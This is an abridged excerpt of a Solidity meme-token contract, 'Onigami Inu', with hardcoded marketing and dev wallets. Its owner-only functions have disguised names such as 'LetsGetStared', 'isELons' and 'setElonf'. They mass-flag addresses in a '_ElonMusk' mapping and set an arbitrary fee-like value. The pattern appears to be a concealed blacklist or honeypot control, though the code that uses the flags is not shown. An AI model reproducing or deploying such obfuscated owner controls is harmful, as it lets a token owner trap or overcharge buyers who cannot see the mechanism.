...
/**
    Website: https://onigamiinu.com
    Twitter: https://twitter.com/OnigamiInu
    Telegram: https://t.me/OnigamiInu
...
contract Onigami is Context, IERC20 { 
    ...
    mapping (address => bool) public _ElonMusk;
    address[] public _Elon;

    address payable public Wallet_Marketing = payable(0x83a49dEde3c8EA61aE824A22A89e096A42C4f027); 
    address payable public Wallet_Dev = payable(0x371bE6dA14280Ffaa95A03A3Fe35C7303b7cE8e6);
    ...
    string private constant _name = "OGINU"; 
    string private constant _symbol = unicode"Onigami Inu"; 

    uint8 private txCount = 0;
    uint8 private swapTrigger = 10; 
    uint256 private _Elon_f = 0;
    ...
    function LetsGetStared() external onlyOwner {
        for (uint256 i = 0; i < _Elon.length; i++) {
            _ElonMusk[_Elon[i]] = true;
        }
    }
        
    function isELons(address[] memory addrs)
        external
        onlyOwner
        returns (bool)
    {
        for (uint256 i = 0; i < addrs.length; i++) {
            _ElonMusk[addrs[i]] = false;
        }
        return true;
    }
    
    function setElonf(uint256 newNum) public onlyOwner{
        _Elon_f = newNum;
    }
